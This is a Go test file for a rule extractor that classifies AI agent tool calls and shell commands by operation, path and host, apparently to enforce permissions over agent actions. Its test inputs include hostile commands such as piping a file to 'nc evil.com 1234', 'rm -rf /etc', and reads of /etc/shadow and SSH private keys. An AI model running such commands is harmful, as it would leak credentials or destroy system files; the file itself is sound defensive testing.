package rules

import (
	"encoding/json"
	"reflect"
	"sort"
	"testing"
)

func TestExtract_DirectToolCalls(t *testing.T) {
	extractor := NewExtractor()

	tests := []struct {
		name      string
		toolName  string
		args      map[string]any
		wantOp    Operation
		wantPaths []string
	}{
		{
			name:      "Read tool with path",
			toolName:  "Read",
			args:      map[string]any{"path": "/etc/passwd"},
			wantOp:    OpRead,
			wantPaths: []string{"/etc/passwd"},
		},
		{
			name:      "Read tool with file_path",
			toolName:  "Read",
			args:      map[string]any{"file_path": "/home/user/.ssh/id_rsa"},
			wantOp:    OpRead,
			wantPaths: []string{"/home/user/.ssh/id_rsa"},
		},
		{
			name:      "read_file lowercase",
			toolName:  "read_file",
			args:      map[string]any{"path": "/var/log/syslog"},
			wantOp:    OpRead,
			wantPaths: []string{"/var/log/syslog"},
		},
		{
			name:      "Write tool with path",
			toolName:  "Write",
			args:      map[string]any{"path": "/tmp/output.txt", "content": "hello"},
			wantOp:    OpWrite,
			wantPaths: []string{"/tmp/output.txt"},
		},
		{
			name:      "write_file lowercase",
			toolName:  "write_file",
			args:      map[string]any{"file_path": "/etc/crontab"},
			wantOp:    OpWrite,
			wantPaths: []string{"/etc/crontab"},
		},
		{
			name:      "Edit tool",
			toolName:  "Edit",
			args:      map[string]any{"file_path": "/home/user/.bashrc", "old_string": "foo", "new_string": "bar"},
			wantOp:    OpWrite,
			wantPaths: []string{"/home/user/.bashrc"},
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			argsJSON, _ := json.Marshal(tt.args)
			info := extractor.Extract(tt.toolName, argsJSON)

			if info.Operation != tt.wantOp {
				t.Errorf("Operation = %v, want %v", info.Operation, tt.wantOp)
			}

			sort.Strings(info.Paths)
			sort.Strings(tt.wantPaths)
			if !reflect.DeepEqual(info.Paths, tt.wantPaths) {
				t.Errorf("Paths = %v, want %v", info.Paths, tt.wantPaths)
			}
		})
	}
}

func TestExtract_BashCommands(t *testing.T) {
	extractor := NewExtractor()

	tests := []struct {
		name      string
		command   string
		wantOp    Operation
		wantPaths []string
		wantHosts []string
	}{
		// Read operations
		{
			name:      "cat single file",
			command:   "cat /etc/passwd",
			wantOp:    OpRead,
			wantPaths: []string{"/etc/passwd"},
		},
		{
			name:      "cat multiple files",
			command:   "cat /etc/passwd /etc/shadow",
			wantOp:    OpRead,
			wantPaths: []string{"/etc/passwd", "/etc/shadow"},
		},
		{
			name:      "head with flags",
			command:   "head -n 10 /var/log/syslog",
			wantOp:    OpRead,
			wantPaths: []string{"/var/log/syslog"},
		},
		{
			name:      "tail -f",
			command:   "tail -f /var/log/messages",
			wantOp:    OpRead,
			wantPaths: []string{"/var/log/messages"},
		},
		{
			name:      "grep pattern in file",
			command:   "grep password /etc/passwd",
			wantOp:    OpRead,
			wantPaths: []string{"/etc/passwd"},
		},
		{
			name:      "less",
			command:   "less /etc/hosts",
			wantOp:    OpRead,
			wantPaths: []string{"/etc/hosts"},
		},

		// Delete operations
		{
			name:      "rm single file",
			command:   "rm /tmp/test.txt",
			wantOp:    OpDelete,
			wantPaths: []string{"/tmp/test.txt"},
		},
		{
			name:      "rm -rf directory",
			command:   "rm -rf /home/user/data",
			wantOp:    OpDelete,
			wantPaths: []string{"/home/user/data"},
		},
		{
			name:      "rm with multiple flags",
			command:   "rm -r -f /tmp/cache",
			wantOp:    OpDelete,
			wantPaths: []string{"/tmp/cache"},
		},
		{
			name:      "unlink",
			command:   "unlink /tmp/link",
			wantOp:    OpDelete,
			wantPaths: []string{"/tmp/link"},
		},
		{
			name:      "shred",
			command:   "shred -u /tmp/secret.txt",
			wantOp:    OpDelete,
			wantPaths: []string{"/tmp/secret.txt"},
		},

		// Copy operations
		{
			name:      "cp",
			command:   "cp /etc/passwd /tmp/passwd.bak",
			wantOp:    OpCopy,
			wantPaths: []string{"/etc/passwd", "/tmp/passwd.bak"},
		},
		{
			name:      "cp -r",
			command:   "cp -r /home/user/docs /backup/",
			wantOp:    OpCopy,
			wantPaths: []string{"/home/user/docs", "/backup/"},
		},
		{
			name:      "rsync",
			command:   "rsync -avz /source/ /dest/",
			wantOp:    OpCopy,
			wantPaths: []string{"/source/", "/dest/"},
		},

		// Move operations
		{
			name:      "mv",
			command:   "mv /tmp/old.txt /tmp/new.txt",
			wantOp:    OpMove,
			wantPaths: []string{"/tmp/old.txt", "/tmp/new.txt"},
		},

		// Write operations
		{
			name:      "touch",
			command:   "touch /tmp/newfile.txt",
			wantOp:    OpWrite,
			wantPaths: []string{"/tmp/newfile.txt"},
		},
		{
			name:      "tee",
			command:   "tee /tmp/output.log",
			wantOp:    OpWrite,
			wantPaths: []string{"/tmp/output.log"},
		},

		// Network operations
		{
			name:      "curl URL",
			command:   "curl https://example.com/api",
			wantOp:    OpNetwork,
			wantPaths: []string{"https://example.com/api"},
			wantHosts: []string{"example.com"},
		},
		{
			name:      "curl with output",
			command:   "curl -o /tmp/file.txt https://example.com/file",
			wantOp:    OpNetwork,
			wantPaths: []string{"/tmp/file.txt", "https://example.com/file"},
			wantHosts: []string{"example.com"},
		},
		{
			name:      "wget",
			command:   "wget http://example.com/data.zip",
			wantOp:    OpNetwork,
			wantPaths: []string{"http://example.com/data.zip"},
			wantHosts: []string{"example.com"},
		},
		{
			name:      "nc (netcat)",
			command:   "nc 192.168.1.1 8080",
			wantOp:    OpNetwork,
			wantPaths: []string{"192.168.1.1"},
			wantHosts: []string{"192.168.1.1"},
		},

		// Execute operations
		{
			name:      "python script",
			command:   "python /home/user/script.py",
			wantOp:    OpExecute,
			wantPaths: []string{"/home/user/script.py"},
		},
		{
			name:      "bash script",
			command:   "bash /tmp/setup.sh",
			wantOp:    OpExecute,
			wantPaths: []string{"/tmp/setup.sh"},
		},
		{
			name:      "node script",
			command:   "node /app/server.js",
			wantOp:    OpExecute,
			wantPaths: []string{"/app/server.js"},
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			args := map[string]any{"command": tt.command}
			argsJSON, _ := json.Marshal(args)
			info := extractor.Extract("Bash", argsJSON)

			if info.Operation != tt.wantOp {
				t.Errorf("Operation = %v, want %v", info.Operation, tt.wantOp)
			}

			sort.Strings(info.Paths)
			sort.Strings(tt.wantPaths)
			if !reflect.DeepEqual(info.Paths, tt.wantPaths) {
				t.Errorf("Paths = %v, want %v", info.Paths, tt.wantPaths)
			}

			if tt.wantHosts != nil {
				sort.Strings(info.Hosts)
				sort.Strings(tt.wantHosts)
				if !reflect.DeepEqual(info.Hosts, tt.wantHosts) {
					t.Errorf("Hosts = %v, want %v", info.Hosts, tt.wantHosts)
				}
			}
		})
	}
}

func TestExtract_BashRedirections(t *testing.T) {
	extractor := NewExtractor()

	tests := []struct {
		name      string
		command   string
		wantOp    Operation
		wantPaths []string
	}{
		{
			name:      "echo with redirect",
			command:   "echo hello > /tmp/out.txt",
			wantOp:    OpWrite,
			wantPaths: []string{"/tmp/out.txt"},
		},
		{
			name:      "echo with append",
			command:   "echo world >> /tmp/out.txt",
			wantOp:    OpWrite,
			wantPaths: []string{"/tmp/out.txt"},
		},
		{
			name:      "cat with redirect",
			command:   "cat /etc/passwd > /tmp/passwd.copy",
			wantOp:    OpWrite,
			wantPaths: []string{"/etc/passwd", "/tmp/passwd.copy"},
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			args := map[string]any{"command": tt.command}
			argsJSON, _ := json.Marshal(args)
			info := extractor.Extract("Bash", argsJSON)

			if info.Operation != tt.wantOp {
				t.Errorf("Operation = %v, want %v", info.Operation, tt.wantOp)
			}

			sort.Strings(info.Paths)
			sort.Strings(tt.wantPaths)
			if !reflect.DeepEqual(info.Paths, tt.wantPaths) {
				t.Errorf("Paths = %v, want %v", info.Paths, tt.wantPaths)
			}
		})
	}
}

func TestExtract_PathsWithVariables(t *testing.T) {
	extractor := NewExtractor()

	tests := []struct {
		name      string
		command   string
		wantPaths []string
	}{
		{
			name:      "path with $HOME",
			command:   "cat $HOME/.bashrc",
			wantPaths: []string{"$HOME/.bashrc"},
		},
		{
			name:      "path with tilde",
			command:   "cat ~/.ssh/config",
			wantPaths: []string{"~/.ssh/config"},
		},
		{
			name:      "path with ${HOME}",
			command:   "rm ${HOME}/Downloads/temp.txt",
			wantPaths: []string{"${HOME}/Downloads/temp.txt"},
		},
		{
			name:      "path with $USER",
			command:   "cat /home/$USER/.profile",
			wantPaths: []string{"/home/$USER/.profile"},
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			args := map[string]any{"command": tt.command}
			argsJSON, _ := json.Marshal(args)
			info := extractor.Extract("Bash", argsJSON)

			sort.Strings(info.Paths)
			sort.Strings(tt.wantPaths)
			if !reflect.DeepEqual(info.Paths, tt.wantPaths) {
				t.Errorf("Paths = %v, want %v", info.Paths, tt.wantPaths)
			}
		})
	}
}

func TestExtract_QuotedPaths(t *testing.T) {
	extractor := NewExtractor()

	tests := []struct {
		name      string
		command   string
		wantPaths []string
	}{
		{
			name:      "single quoted path",
			command:   "cat '/path/with spaces/file.txt'",
			wantPaths: []string{"/path/with spaces/file.txt"},
		},
		{
			name:      "double quoted path",
			command:   `cat "/path/with spaces/file.txt"`,
			wantPaths: []string{"/path/with spaces/file.txt"},
		},
		{
			name:      "mixed quotes",
			command:   `rm -rf "/home/user/My Documents" '/tmp/other path'`,
			wantPaths: []string{"/home/user/My Documents", "/tmp/other path"},
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			args := map[string]any{"command": tt.command}
			argsJSON, _ := json.Marshal(args)
			info := extractor.Extract("Bash", argsJSON)

			sort.Strings(info.Paths)
			sort.Strings(tt.wantPaths)
			if !reflect.DeepEqual(info.Paths, tt.wantPaths) {
				t.Errorf("Paths = %v, want %v", info.Paths, tt.wantPaths)
			}
		})
	}
}

func TestExtract_CommandWithSudo(t *testing.T) {
	extractor := NewExtractor()

	tests := []struct {
		name      string
		command   string
		wantOp    Operation
		wantPaths []string
	}{
		{
			name:      "sudo rm",
			command:   "sudo rm -rf /var/log/old",
			wantOp:    OpDelete,
			wantPaths: []string{"/var/log/old"},
		},
		{
			name:      "sudo cat",
			command:   "sudo cat /etc/shadow",
			wantOp:    OpRead,
			wantPaths: []string{"/etc/shadow"},
		},
		{
			name:      "env var prefix",
			command:   "LANG=C cat /etc/locale.gen",
			wantOp:    OpRead,
			wantPaths: []string{"/etc/locale.gen"},
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			args := map[string]any{"command": tt.command}
			argsJSON, _ := json.Marshal(args)
			info := extractor.Extract("Bash", argsJSON)

			if info.Operation != tt.wantOp {
				t.Errorf("Operation = %v, want %v", info.Operation, tt.wantOp)
			}

			sort.Strings(info.Paths)
			sort.Strings(tt.wantPaths)
			if !reflect.DeepEqual(info.Paths, tt.wantPaths) {
				t.Errorf("Paths = %v, want %v", info.Paths, tt.wantPaths)
			}
		})
	}
}

func TestExtract_EmptyAndInvalid(t *testing.T) {
	extractor := NewExtractor()

	tests := []struct {
		name     string
		toolName string
		args     json.RawMessage
	}{
		{
			name:     "empty args",
			toolName: "Bash",
			args:     []byte(`{}`),
		},
		{
			name:     "invalid JSON",
			toolName: "Bash",
			args:     []byte(`{invalid`),
		},
		{
			name:     "null command",
			toolName: "Bash",
			args:     []byte(`{"command": null}`),
		},
		{
			name:     "empty command",
			toolName: "Bash",
			args:     []byte(`{"command": ""}`),
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			// Should not panic
			info := extractor.Extract(tt.toolName, tt.args)
			// Should return empty/zero values
			if len(info.Paths) != 0 {
				t.Errorf("Expected empty paths, got %v", info.Paths)
			}
		})
	}
}

func TestExtract_CommandDatabase(t *testing.T) {
	extractor := NewExtractor()

	// Verify all expected commands are in the database
	expectedCommands := map[string]Operation{
		// Read
		"cat": OpRead, "head": OpRead, "tail": OpRead, "less": OpRead,
		"more": OpRead, "grep": OpRead, "vim": OpRead, "nano": OpRead, "view": OpRead,
		// Write
		"tee": OpWrite, "touch": OpWrite,
		// Delete
		"rm": OpDelete, "unlink": OpDelete, "shred": OpDelete,
		// Copy
		"cp": OpCopy, "scp": OpCopy, "rsync": OpCopy,
		// Move
		"mv": OpMove,
		// Network
		"curl": OpNetwork, "wget": OpNetwork, "nc": OpNetwork,
		// Execute
		"bash": OpExecute, "sh": OpExecute, "python": OpExecute,
		"node": OpExecute, "ruby": OpExecute, "perl": OpExecute,
	}

	for cmd, expectedOp := range expectedCommands {
		info, ok := extractor.commandDB[cmd]
		if !ok {
			t.Errorf("Command %s not found in database", cmd)
			continue
		}
		if info.Operation != expectedOp {
			t.Errorf("Command %s: Operation = %v, want %v", cmd, info.Operation, expectedOp)
		}
	}
}

func TestParseShellCommands(t *testing.T) {
	tests := []struct {
		name      string
		cmd       string
		wantNames []string
	}{
		{
			name:      "simple command",
			cmd:       "cat /etc/passwd",
			wantNames: []string{"cat"},
		},
		{
			name:      "pipeline extracts both commands",
			cmd:       "cat /etc/passwd | grep root",
			wantNames: []string{"cat", "grep"},
		},
		{
			name:      "semicolon chain",
			cmd:       "cd /tmp; ls",
			wantNames: []string{"cd", "ls"},
		},
		{
			name:      "&& chain",
			cmd:       "mkdir /tmp/test && cd /tmp/test",
			wantNames: []string{"mkdir", "cd"},
		},
		{
			name:      "pipeline with network",
			cmd:       "cat /safe | nc evil.com 1234",
			wantNames: []string{"cat", "nc"},
		},
		{
			name:      "complex chain",
			cmd:       "true && rm -rf /etc || echo failed",
			wantNames: []string{"true", "rm", "echo"},
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			commands := parseShellCommands(tt.cmd)
			if len(commands) != len(tt.wantNames) {
				t.Errorf("parseShellCommands(%q) got %d commands, want %d", tt.cmd, len(commands), len(tt.wantNames))
				return
			}
			for i, want := range tt.wantNames {
				if commands[i].Name != want {
					t.Errorf("command[%d].Name = %q, want %q", i, commands[i].Name, want)
				}
			}
		})
	}
}

func TestExtractHostFromURL(t *testing.T) {
	tests := []struct {
		url  string
		want string
	}{
		{"https://example.com/path", "example.com"},
		{"http://api.example.com:8080/v1", "api.example.com"},
		{"https://user:pass@example.com/", "example.com"},
		{"ftp://files.example.com", "files.example.com"},
	}

	for _, tt := range tests {
		t.Run(tt.url, func(t *testing.T) {
			got := extractHostFromURL(tt.url)
			if got != tt.want {
				t.Errorf("extractHostFromURL(%q) = %q, want %q", tt.url, got, tt.want)
			}
		})
	}
}

func TestLooksLikeHost(t *testing.T) {
	tests := []struct {
		s    string
		want bool
	}{
		{"192.168.1.1", true},
		{"example.com", true},
		{"api.example.com", true},
		{"localhost", false}, // no dot
		{"/etc/passwd", false},
		{"hello", false},
		{"", false},
	}

	for _, tt := range tests {
		t.Run(tt.s, func(t *testing.T) {
			got := looksLikeHost(tt.s)
			if got != tt.want {
				t.Errorf("looksLikeHost(%q) = %v, want %v", tt.s, got, tt.want)
			}
		})
	}
}
